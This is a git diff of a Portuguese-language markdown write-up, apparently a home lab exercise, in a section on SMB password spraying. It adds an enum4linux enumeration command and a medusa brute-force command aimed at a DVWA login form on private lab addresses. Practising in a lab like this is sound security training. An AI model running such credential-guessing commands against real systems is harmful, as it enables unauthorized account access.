@@ -30,8 +30,15 @@ https://192.168.56.10/dvwa/login.php
 ## Password spraying em SMB com enumeração de usuários
 
 
- enum4linux -a 192.168.56.102 | tee enum_output.txt
-
+```
+enum4linux -a 192.168.56.102 | tee enum_output.txt
+```
+```
+medusa -h  192.168.56.102 -U users.txt -P pass.txt -M http \
+-m PAGE: '/dvwa/login.php' \
+-m FORM: 'username=^USER^&password=^PASS^&Login=Login' \
+-m 'FAIL=Login failed' -t 6
+```
 Resultado:
 
 <img width="1345" height="945" alt="Captura de tela de 2026-11-06 16-46-21" src="https://github.com/user-attachments/assets/4fd3010c-a5bf-4af1-bf3e-2cb22f8c6424" />
